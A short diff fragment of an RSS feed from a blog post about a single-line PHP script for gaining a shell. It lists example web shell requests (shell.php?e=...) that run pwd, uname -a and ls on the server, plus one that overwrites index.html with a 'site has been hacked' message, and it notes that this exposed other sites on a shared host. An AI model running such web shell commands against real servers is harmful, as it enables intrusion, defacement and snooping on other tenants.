+<li><code>shell.php?e=pwd</code></li>
+<li><code>shell.php?e=uname%20-a</code> (I had to URL encode the spaces otherwise my browser thought it should search using google)</li>
+<li><code>shell.php?e=echo%20This%20site%20has%20been%20hacked%3Eindex.html</code></li>
+<li><code>shell?e=ls%20-l%20/tmp</code></li>
+</ul>
+<p>The last command even showed me some files and their owners which in turn (because I am using a shared host) told me the names of some of the other sites are that are running on the same server as mine, which was an unexpected &#8220;bonus&#8221; find.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/single-line-php-script-to-gain-shell/feed/</wfw:commentRss>
+			<slash:comments>4</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
